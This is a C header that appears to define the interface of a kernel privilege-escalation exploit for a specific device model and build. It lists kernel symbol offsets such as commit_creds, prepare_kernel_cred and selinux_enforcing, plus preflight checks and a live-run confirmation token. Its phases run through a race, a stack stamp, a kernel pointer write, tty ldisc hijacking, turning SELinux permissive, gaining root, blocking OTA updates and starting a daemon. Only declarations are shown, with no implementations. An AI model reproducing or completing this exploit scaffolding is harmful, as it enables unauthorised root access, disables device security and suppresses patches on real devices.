#ifndef KARA_GHOSTLOCK_H
#define KARA_GHOSTLOCK_H

#include <stddef.h>
#include <stdint.h>

#define KARA_SELECT_WORDS 10u
#define KARA_LIVE_CONFIRMATION "RUN-KARA-PS7713-GHOSTLOCK"
#define KARA_MAX_COMMAND 65536u
#define KARA_SCHED_BATCH 3u

struct kara_sched_attr {
    uint32_t size;
    uint32_t sched_policy;
    uint64_t sched_flags;
    int32_t sched_nice;
    uint32_t sched_priority;
    uint64_t sched_runtime;
    uint64_t sched_deadline;
    uint64_t sched_period;
};

struct kara_profile {
    uint32_t init_task;
    uint32_t init_cred;
    uint32_t prepare_kernel_cred;
    uint32_t commit_creds;
    uint32_t selinux_enforcing;
    uint32_t tty_ldiscs;
    uint32_t fake_lock;
    uint32_t ldisc_dispatch;
    uint32_t zero_word;
    int ldisc_slot;
};

extern const struct kara_profile KARA_PS7713_PROFILE;

struct kara_select_stamp {
    uint32_t in[KARA_SELECT_WORDS];
    uint32_t out[KARA_SELECT_WORDS];
    uint32_t ex[KARA_SELECT_WORDS];
};

enum kara_gate {
    KARA_GATE_ARM32 = 1u << 0,
    KARA_GATE_FOUR_CPUS = 1u << 1,
    KARA_GATE_KERNEL = 1u << 2,
    KARA_GATE_DEVICE = 1u << 3,
    KARA_GATE_MODEL = 1u << 4,
    KARA_GATE_BUILD = 1u << 5,
    KARA_GATE_UID = 1u << 6,
    KARA_GATE_SELINUX = 1u << 7,
    KARA_GATE_CEC_GUARD = 1u << 8,
};

struct kara_preflight {
    int arm32;
    int four_cpus;
    int kernel_exact;
    int device_kara;
    int model_aftka;
    int build_exact;
    int uid_shell;
    int selinux_enforcing;
    int cec_standby_blocked;
};

enum kara_phase {
    KARA_PHASE_NEW = 0,
    KARA_PHASE_PREFLIGHT_OK,
    KARA_PHASE_FDS_READY,
    KARA_PHASE_RACE_OPEN,
    KARA_PHASE_STACK_STAMPED,
    KARA_PHASE_POINTER_WRITTEN,
    KARA_PHASE_LDISC_BOUND,
    KARA_PHASE_PERMISSIVE,
    KARA_PHASE_ROOT,
    KARA_PHASE_OTA_CONTAINED,
    KARA_PHASE_DAEMON_READY,
};

void kara_build_select_stamp(struct kara_select_stamp *stamp,
                             const struct kara_profile *profile);
size_t kara_collect_read_fds(const struct kara_select_stamp *stamp,
                             int *fds, size_t capacity);
uint32_t kara_preflight_missing(const struct kara_preflight *observed);
int kara_live_confirmation_valid(const char *token);
int kara_command_length_valid(size_t length);
int kara_phase_step(enum kara_phase *phase, enum kara_phase next);
int kara_tcp_mcast_copy_confirmed(int result, int saved_errno);
int kara_kernel_pointer_result(int result, uint32_t *pointer);
void kara_build_nonpreempting_sched_attr(struct kara_sched_attr *attr,
                                         int current_nice);

#endif
